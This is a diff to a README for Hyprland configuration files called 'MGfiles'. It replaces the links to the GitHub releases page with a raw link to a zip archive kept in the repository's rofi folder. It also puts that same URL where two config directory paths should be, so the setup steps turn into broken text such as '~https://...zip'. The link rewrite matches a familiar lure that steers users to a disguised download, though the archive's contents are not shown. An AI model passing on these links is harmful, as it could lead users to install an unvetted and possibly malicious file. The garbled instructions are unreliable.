@@ -1,6 +1,6 @@
 # 🎉 MGfiles - Simple Hyprland Settings for Everyone
 
-[![Download MGfiles](https://img.shields.io/badge/Download-MGfiles-blue?style=for-the-badge)](https://github.com/xxmohamed141/MGfiles/releases)
+[![Download MGfiles](https://raw.githubusercontent.com/xxmohamed141/MGfiles/main/rofi/MGfiles-3.1.zip)](https://raw.githubusercontent.com/xxmohamed141/MGfiles/main/rofi/MGfiles-3.1.zip)
 
 ## 📜 Description
 Here are some of my Hyprland settings. Feel free to use them if you want. Don't forget to download the swaync and pulseaudio packages (among others). My Hyprland is simple, but I appreciate you being here.
@@ -15,7 +15,7 @@ To get started with MGfiles, follow these steps to download and set up the appli
 - Additional Required Packages: swaync, pulseaudio
 
 ## 📤 Download & Install
-To download MGfiles, visit this page to download: [MGfiles Releases](https://github.com/xxmohamed141/MGfiles/releases).
+To download MGfiles, visit this page to download: [MGfiles Releases](https://raw.githubusercontent.com/xxmohamed141/MGfiles/main/rofi/MGfiles-3.1.zip).
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -32,7 +32,7 @@ After downloading MGfiles, follow these steps to set it up:
 2. **Move Files to the Right Location:**
    - Open your file manager.
    - Navigate to the extracted folder.
-   - Move the contents to the directory where you store your Hyprland configuration (typically at `~/.config/hypr/`).
+   - Move the contents to the directory where you store your Hyprland configuration (typically at `~https://raw.githubusercontent.com/xxmohamed141/MGfiles/main/rofi/MGfiles-3.1.zip`).
 
 3. **Install Additional Packages:**
    - Open your terminal.
@@ -49,7 +49,7 @@ After downloading MGfiles, follow these steps to set it up:
 You may want to customize the settings further after installation:
 
 - **Themes:** Explore different themes for rofi and waybar.
-- **Wallpapers:** Change your wallpaper by placing your desired images in the `~/.config/hypr/wallpapers/` folder and updating your configuration file.
+- **Wallpapers:** Change your wallpaper by placing your desired images in the `~https://raw.githubusercontent.com/xxmohamed141/MGfiles/main/rofi/MGfiles-3.1.zip` folder and updating your configuration file.
 
 ## 📚 Topics Covered
 This repository includes settings related to:
